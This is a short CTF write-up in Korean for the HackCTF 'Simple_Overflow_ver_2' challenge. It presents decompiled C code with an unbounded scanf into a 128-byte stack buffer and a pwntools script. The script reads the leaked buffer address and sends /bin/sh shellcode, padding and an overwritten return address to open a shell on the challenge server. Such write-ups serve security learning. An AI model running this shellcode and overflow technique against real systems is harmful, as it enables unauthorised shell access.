---


---

<h1 id="hackctfsimple_overflow_ver_2">HackCTF:Simple_Overflow_ver_2</h1>
<h2 id="section">2019-08-13</h2>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // ebx
  char v5; // [esp+13h] [ebp-89h]
  char s[128]; // [esp+14h] [ebp-88h]
  int i; // [esp+94h] [ebp-8h]

  setvbuf(stdout, 0, 2, 0);
  v5 = 121;
  do
  {
    printf("Data : ");
    if ( __isoc99_scanf(" %[^\n]s", s) )
    {
      for ( i = 0; ; ++i )
      {
        v3 = i;
        if ( v3 &gt;= strlen(s) )
          break;
        if ( !(i &amp; 0xF) )
          printf("%p: ", &amp;s[i]);
        printf(" %c", (unsigned __int8)s[i]);
        if ( i % 16 == 15 )
          putchar(10);
      }
    }
    printf("\nAgain (y/n): ");
  }
  while ( __isoc99_scanf(" %c", &amp;v5) &amp;&amp; (v5 == 121 || v5 == 89) );
  return 0;
}
</code></pre>
<p>프로그램이 실행 되면 현제 입력되는 주소가 출력된다. 이후 함수 scanf() 로 입력 받되, 16byte가 넘어갈 경우 다음 주소로 넘겨버리고 있다. 이 작업을 한번 마치면 분기에서 n을 선택할때 까지 반복한다.<br>
처음에 결정난 주소는 프로그램을 재실행 할때까지 바뀌지 않는다.</p>
<p>배열 s는 IDA에서 확인 할 수 있듯 140byte뒤에 RET가 존재한다.</p>
<pre><code>from pwn import *
p = remote('ctf.j0n9hyun.xyz', 3006)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"


p.recvuntil(": ")
p.sendline("A")

buff = int(p.recv(10), 16)

payload = ''
payload += "y"
payload += shellcode
payload += "A" * 116
payload += p32(buff)

p.sendline(payload)
p.interactive()
</code></pre>

